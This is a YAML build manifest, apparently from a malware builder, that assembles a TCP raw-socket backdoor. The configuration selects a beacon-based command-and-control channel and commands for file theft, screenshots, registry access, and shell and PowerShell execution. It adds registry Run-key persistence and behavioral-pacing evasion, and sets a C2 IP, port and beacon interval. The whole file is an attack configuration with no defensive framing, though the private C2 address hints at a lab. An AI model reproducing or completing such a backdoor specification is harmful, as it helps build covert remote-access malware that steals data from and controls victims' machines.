name: backdoor_tcp_api
description: TCP raw-socket backdoor — API-only commands, no child processes

core:
  - core/emit_buffer
  - core/file_ops

c2: c2/tcp_beacon

commands:
  - commands/cmd_sysinfo
  - commands/cmd_processes
  - commands/cmd_filelist
  - commands/cmd_fileread
  - commands/cmd_filewrite
  - commands/cmd_screenshot
  - commands/cmd_registry
  - commands/cmd_netinfo
  - commands/cmd_exec
  - commands/cmd_exec_powershell

arch: arch/backdoor
persist: persist/registry_run

resources: true

evasion:
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  BEACON_INTERVAL_MS: "30000"
